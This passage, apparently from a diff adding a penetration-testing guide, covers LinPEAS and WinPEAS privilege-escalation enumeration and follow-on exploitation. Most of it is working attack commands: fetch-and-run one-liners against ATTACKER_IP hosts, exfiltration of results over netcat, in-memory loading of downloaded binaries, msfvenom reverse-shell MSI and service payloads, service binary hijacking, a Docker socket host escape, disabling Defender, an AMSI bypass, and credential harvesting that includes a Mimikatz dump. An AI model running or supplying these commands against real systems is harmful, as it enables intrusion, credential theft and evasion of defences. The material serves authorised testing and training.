+# PATH hijacking opportunities
+# Writable systemd services
+# Cron job scripts
+
+# Example: Writable PATH directory
+echo "/bin/bash" > /writable/path/vulnerable_binary
+chmod +x /writable/path/vulnerable_binary
+```
+
+**5. Credentials:**
+```bash
+# Database credentials
+# Configuration files with passwords
+# History files
+# SSH keys
+
+# Common locations highlighted:
+# /var/www/html/config.php
+# ~/.bash_history
+# ~/.ssh/id_rsa
+```
+
+**6. Running Processes:**
+```bash
+# Processes running as root
+# Vulnerable applications
+# Interesting ports
+
+# Example: MySQL running as root
+# Exploit with UDF
+```
+
+**7. Network Information:**
+```bash
+# Open ports
+# Internal networks
+# Firewall rules
+
+# Pivot opportunities identified
+```
+
+### Practical Usage Examples
+
+**CTF/Lab scenario:**
+```bash
+# Step 1: Upload and execute
+wget http://10.10.14.5/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh | tee linpeas_output.txt
+
+# Step 2: Review critical findings
+cat linpeas_output.txt | grep -E "95%|RED|YELLOW" -A 5
+
+# Step 3: Focus on specific vector
+# If SUID binary found
+/usr/bin/pkexec --version  # Check for CVE-2021-4034
+/usr/bin/find . -exec /bin/sh -p \; -quit
+
+# If sudo misconfiguration
+sudo -l
+sudo /vulnerable/binary
+
+# If kernel exploit
+searchsploit linux kernel 5.4.0
+```
+
+**Real-world engagement:**
+```bash
+# Stealthy execution (minimal footprint)
+curl -s http://ATTACKER_IP/linpeas.sh | bash > /dev/null 2>&1 &
+
+# Save output to attacker machine
+./linpeas.sh | nc ATTACKER_IP 4444
+
+# On attacker
+nc -lvnp 4444 > linpeas_output.txt
+```
+
+**Automation integration:**
+```bash
+# Automated exploitation framework
+#!/bin/bash
+# Upload linpeas
+scp linpeas.sh user@target:/tmp/
+
+# Execute and retrieve
+ssh user@target "/tmp/linpeas.sh" > results/$(date +%Y%m%d)_linpeas.txt
+
+# Parse for critical findings
+grep -E "95%|CVE" results/*_linpeas.txt
+```
+
+### LinPEAS Alternative Modes
+
+**Binary version (compiled):**
+```bash
+# Download precompiled binary
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+
+# Execute
+chmod +x linpeas_linux_amd64
+./linpeas_linux_amd64
+
+# ARM architecture
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_arm
+```
+
+**Docker container enumeration:**
+```bash
+# If inside Docker container, LinPEAS detects
+# Look for:
+# - Docker socket (/var/run/docker.sock)
+# - Kubernetes service account tokens
+# - Container escape vulnerabilities
+
+# Docker socket exploitation
+docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs bash
+```
+
+---
+
+## WinPEAS
+
+### Installation and Deployment
+
+**Download WinPEAS:**
+```bash
+# On attacker machine
+# .exe (compiled executable)
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe  # Any CPU
+
+# .bat (batch script version)
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat
+
+# Obfuscated version (AV evasion)
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe
+```
+
+**Transfer to Windows target:**
+```bash
+# Via Evil-WinRM
+*Evil-WinRM* PS C:\> upload /opt/winPEASx64.exe C:\Windows\Temp\winpeas.exe
+
+# Via HTTP
+# On attacker
+python3 -m http.server 8000
+
+# On target (PowerShell)
+Invoke-WebRequest -Uri http://ATTACKER_IP:8000/winPEASx64.exe -OutFile C:\Windows\Temp\winpeas.exe
+certutil -urlcache -f http://ATTACKER_IP:8000/winPEASx64.exe C:\Windows\Temp\winpeas.exe
+
+# Via SMB
+# On attacker
+impacket-smbserver share /opt/winpeas -smb2support
+
+# On target
+copy \\ATTACKER_IP\share\winPEASx64.exe C:\Windows\Temp\winpeas.exe
+
+# Base64 transfer (small files)
+# On attacker
+base64 -w 0 winPEASx64.exe > winpeas_b64.txt
+
+# On target (PowerShell)
+$b64 = "BASE64_CONTENT"
+[IO.File]::WriteAllBytes("C:\Windows\Temp\winpeas.exe", [Convert]::FromBase64String($b64))
+```
+
+**In-memory execution (avoid disk writes):**
+```bash
+# PowerShell download and execute
+*Evil-WinRM* PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/winPEAS.bat')
+
+# Reflective PE injection (advanced)
+# Requires PowerShell wrapper for .exe
+*Evil-WinRM* PS C:\> $data = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP:8000/winPEASx64.exe')
+*Evil-WinRM* PS C:\> [System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, $null)
+```
+
+### Basic Execution
+
+**Standard execution:**
+```bash
+# Via Evil-WinRM or RDP
+*Evil-WinRM* PS C:\Windows\Temp> .\winpeas.exe
+
+# With output redirection
+*Evil-WinRM* PS C:\> .\winpeas.exe > output.txt
+
+# Batch version
+*Evil-WinRM* PS C:\> .\winPEAS.bat
+
+# Specific checks only
+*Evil-WinRM* PS C:\> .\winpeas.exe fast
+
+# All checks
+*Evil-WinRM* PS C:\> .\winpeas.exe all
+```
+
+**Command-line options:**
+```bash
+# Display help
+.\winpeas.exe help
+
+# Fast scan (reduced checks)
+.\winpeas.exe fast
+
+# Full scan
+.\winpeas.exe all
+
+# Specific categories
+.\winpeas.exe systeminfo
+.\winpeas.exe userinfo
+.\winpeas.exe processinfo
+.\winpeas.exe servicesinfo
+.\winpeas.exe applicationsinfo
+.\winpeas.exe networkinfo
+.\winpeas.exe windowscreds
+.\winpeas.exe filesinfo
+
+# Quiet mode (less output)
+.\winpeas.exe quiet
+
+# No color output
+.\winpeas.exe cmd
+```
+
+**Output formatting:**
+```bash
+# Text output
+.\winpeas.exe > winpeas_output.txt
+
+# HTML output
+.\winpeas.exe htmloutput
+
+# Download to attacker via Evil-WinRM
+*Evil-WinRM* PS C:\> .\winpeas.exe > C:\Windows\Temp\output.txt
+*Evil-WinRM* PS C:\> download C:\Windows\Temp\output.txt /root/winpeas_results.txt
+```
+
+### Key Enumeration Areas
+
+**1. System Information:**
+```
+- OS Version and Architecture
+- Hostname and Domain
+- Current User and Privileges
+- PowerShell versions
+- Antivirus products
+- Windows Defender status
+- UAC settings
+```
+
+**2. User Information:**
+```
+- Current user details
+- User privileges (whoami /all equivalent)
+- Local users and groups
+- Recently accessed files
+- Clipboard contents
+- Saved RDP connections
+```
+
+**3. Process Information:**
+```
+- Running processes (especially as SYSTEM)
+- Process permissions
+- Unquoted service paths
+- DLL hijacking opportunities
+```
+
+**4. Service Information:**
+```
+- Modifiable services
+- Service binary permissions
+- Unquoted service paths
+- Service restart permissions
+- PATH DLL hijacking
+```
+
+**5. Registry Analysis:**
+```
+- Always Install Elevated
+- AutoLogon credentials
+- Stored credentials
+- SNMP community strings
+- Putty sessions
+- VNC passwords
+```
+
+**6. Scheduled Tasks:**
+```
+- Modifiable scheduled tasks
+- Tasks running as SYSTEM
+- Writable task scripts
+```
+
+**7. Network Configuration:**
+```
+- Network interfaces
+- Open ports
+- Firewall rules
+- Active connections
+- Network shares
+- Wi-Fi profiles
+```
+
+**8. Credentials:**
+```
+- Credentials in registry
+- Credentials in files
+- Unattend.xml files
+- Web.config files
+- PowerShell history
+- IIS application pools
+```
+
+**9. File System:**
+```
+- Writable directories
+- Interesting files
+- Recent documents
+- Downloaded files
+- Backup files
+```
+
+**10. Windows Exploits:**
+```
+- Missing patches
+- Known vulnerabilities (CVEs)
+- Kernel exploit suggestions
+```
+
+### Output Interpretation
+
+**Critical findings (Red/Yellow):**
+
+**AlwaysInstallElevated:**
+```powershell
+# If both registry keys are set to 1
+# HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+# HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+# Exploit: Create malicious MSI
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o exploit.msi
+
+# Upload and install
+*Evil-WinRM* PS C:\> upload exploit.msi C:\Windows\Temp\exploit.msi
+*Evil-WinRM* PS C:\> msiexec /quiet /qn /i C:\Windows\Temp\exploit.msi
+```
+
+**Unquoted Service Paths:**
+```powershell
+# Example finding:
+# C:\Program Files\Vulnerable Service\service.exe
+
+# Exploit: Place malicious executable
+*Evil-WinRM* PS C:\> copy C:\Windows\Temp\payload.exe "C:\Program Files\Vulnerable.exe"
+*Evil-WinRM* PS C:\> Restart-Service "VulnerableService"
+```
+
+**Modifiable Service Binary:**
+```powershell
+# Service binary is writable by current user
+
+# Replace with malicious binary
+*Evil-WinRM* PS C:\> upload payload.exe C:\Path\To\Service\binary.exe
+*Evil-WinRM* PS C:\> Restart-Service ServiceName
+```
+
+**SeImpersonatePrivilege enabled:**
+```powershell
+# Indicates potato exploits applicable
+# JuicyPotato, RoguePotato, PrintSpoofer
+
+# Upload and execute PrintSpoofer
+*Evil-WinRM* PS C:\> upload PrintSpoofer.exe C:\Windows\Temp\ps.exe
+*Evil-WinRM* PS C:\> C:\Windows\Temp\ps.exe -i -c cmd
+```
+
+**AutoLogon Credentials:**
+```powershell
+# Found in registry:
+# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+
+# Extract credentials
+*Evil-WinRM* PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select DefaultUserName,DefaultPassword
+```
+
+### Practical Workflows
+
+**Initial enumeration workflow:**
+```bash
+# Step 1: Upload WinPEAS via Evil-WinRM
+evil-winrm -i 192.168.1.10 -u user -p 'password'
+*Evil-WinRM* PS C:\> upload /opt/winPEASx64.exe C:\Windows\Temp\wp.exe
+
+# Step 2: Execute with output
+*Evil-WinRM* PS C:\> C:\Windows\Temp\wp.exe > C:\Windows\Temp\output.txt
+
+# Step 3: Download results
+*Evil-WinRM* PS C:\> download C:\Windows\Temp\output.txt /root/winpeas_output.txt
+
+# Step 4: Analyze locally
+cat /root/winpeas_output.txt | grep -E "95%|Password|Vuln" -A 5
+```
+
+**Quick privilege escalation check:**
+```bash
+# Fast mode for quick wins
+*Evil-WinRM* PS C:\> .\winpeas.exe fast | Select-String -Pattern "Token","Privilege","Password"
+
+# Focus on high-value targets
+*Evil-WinRM* PS C:\> .\winpeas.exe servicesinfo | Select-String -Pattern "Modifiable","Unquoted"
+```
+
+**Credential harvesting workflow:**
+```bash
+# Step 1: Run credentials-focused scan
+*Evil-WinRM* PS C:\> .\winpeas.exe windowscreds > creds.txt
+
+# Step 2: Search specific locations
+*Evil-WinRM* PS C:\> Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.txt,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern "password","pwd","connectionString"
+
+# Step 3: Check PowerShell history
+*Evil-WinRM* PS C:\> Get-Content (Get-PSReadlineOption).HistorySavePath
+
+# Step 4: Extract saved credentials
+*Evil-WinRM* PS C:\> cmdkey /list
+*Evil-WinRM* PS C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
+**Service exploitation workflow:**
+```bash
+# Step 1: Identify vulnerable services
+*Evil-WinRM* PS C:\> .\winpeas.exe servicesinfo | Select-String "Modifiable" -Context 5
+
+# Step 2: Create payload
+# On attacker
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o service.exe
+
+# Step 3: Replace service binary
+*Evil-WinRM* PS C:\> upload service.exe C:\Path\To\Vulnerable\service.exe
+
+# Step 4: Setup listener
+nc -lvnp 4444
+
+# Step 5: Restart service
+*Evil-WinRM* PS C:\> Restart-Service VulnerableService
+```
+
+### AV Evasion
+
+**Obfuscated version:**
+```bash
+# Use obfuscated version
+*Evil-WinRM* PS C:\> upload winPEASx64_ofs.exe C:\Windows\Temp\wp.exe
+
+# Check Windows Defender status first
+*Evil-WinRM* PS C:\> Get-MpPreference
+*Evil-WinRM* PS C:\> Get-MpComputerStatus
+
+# Disable real-time monitoring (if admin)
+*Evil-WinRM* PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+**In-memory execution:**
+```bash
+# Load .NET assembly in memory
+*Evil-WinRM* PS C:\> $data = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/winPEASx64.exe')
+*Evil-WinRM* PS C:\> $assembly = [System.Reflection.Assembly]::Load($data)
+*Evil-WinRM* PS C:\> $assembly.EntryPoint.Invoke($null, @(,$null))
+```
+
+**AMSI bypass before execution:**
+```bash
+*Evil-WinRM* PS C:\> Bypass-4MSI
+*Evil-WinRM* PS C:\> .\winpeas.exe
+```
+
+### Integration with Other Tools
+
+**WinPEAS + PowerUp:**
+```bash
+# WinPEAS for automated enumeration
+*Evil-WinRM* PS C:\> .\winpeas.exe > winpeas_output.txt
+
+# PowerUp for exploitation
+*Evil-WinRM* PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
+*Evil-WinRM* PS C:\> Invoke-AllChecks
+
+# Cross-reference findings
+```
+
+**WinPEAS + Mimikatz:**
+```bash
+# Find credentials with WinPEAS
+*Evil-WinRM* PS C:\> .\winpeas.exe windowscreds
+
+# Dump with Mimikatz
+*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
+```
+
+**WinPEAS + BloodHound:**
+```bash
+# System enumeration with WinPEAS
+*Evil-WinRM* PS C:\> .\winpeas.exe systeminfo
+
+# AD enumeration with SharpHound
+*Evil-WinRM* PS C:\> .\SharpHound.exe -c All
+```
+
+### Troubleshooting
+
+**WinPEAS not executing:**
+```bash
+# Check execution policy
+*Evil-WinRM* PS C:\> Get-ExecutionPolicy
+
+# Bypass execution policy
+*Evil-WinRM* PS C:\> powershell -ExecutionPolicy Bypass -File .\winPEAS.bat
+
+# Check for AV blocking
+*Evil-WinRM* PS C:\> Get-MpComputerStatus
+
+# Try batch version
+*Evil-WinRM* PS C:\> .\winPEAS.bat
+```
+
+**Missing output:**
+```bash
+# Ensure proper redirection
+*Evil-WinRM* PS C:\> cmd /c "winpeas.exe > output.txt 2>&1"
+
+# Check file permissions
+*Evil-WinRM* PS C:\> icacls C:\Windows\Temp
+```
+
+**Performance issues:**
+```bash
+# Use fast mode
+*Evil-WinRM* PS C:\> .\winpeas.exe fast
+
+# Run specific checks only
+*Evil-WinRM* PS C:\> .\winpeas.exe servicesinfo
+```
+
+---
+
+## Combined PEAS Workflow (Multi-OS Environment)
+
+**Scenario: Mixed Windows/Linux infrastructure:**
+
+```bash
+# Phase 1: Initial foothold (Linux)
+evil-winrm -i 192.168.1.10 -u user -p 'pass'
+# Or SSH to Linux box
+ssh user@192.168.1.20
+
+# Phase 2: Linux enumeration
+curl http://ATTACKER_IP/linpeas.sh | bash | tee linpeas_linux.txt
+
+# Phase 3: Identify Windows targets from Linux
+cat linpeas_linux.txt | grep -E "192.168|10.10" | grep "3389\|445\|5985"
+
+# Phase 4: Pivot to Windows
+evil-winrm -i 192.168.1.50 -u discovered_user -H 'HASH'
+
+# Phase 5: Windows enumeration
+*Evil-WinRM* PS C:\> upload winPEASx64.exe C:\Windows\Temp\wp.exe
+*Evil-WinRM* PS C:\> .\wp.exe > output.txt
+*Evil-WinRM* PS C:\> download output.txt /root/winpeas_win.txt
+
+# Phase 6: Compile findings
+grep -E "95%|YELLOW|RED" /root/linpeas_linux.txt /root/winpeas_win.txt
+```
+
+---
+
+## Related Critical Topics
+
+For comprehensive post-exploitation and enumeration mastery, also investigate:
+
+- **PowerSploit/PowerUp** - PowerShell exploitation framework with privilege escalation modules complementing WinPEAS findings
+- **JAWS (Just Another Windows Enum Script)** - Alternative Windows enumeration for comparison with WinPEAS results
+- **Linux Exploit Suggester / Windows Exploit Suggester** - Kernel exploit identification based on system patches
+- **Seatbelt** - C# enumeration tool for .NET environment detailed assessment
+- **Automated Exploitation Frameworks** - Metasploit local_exploit_suggester, Empire situational awareness modules
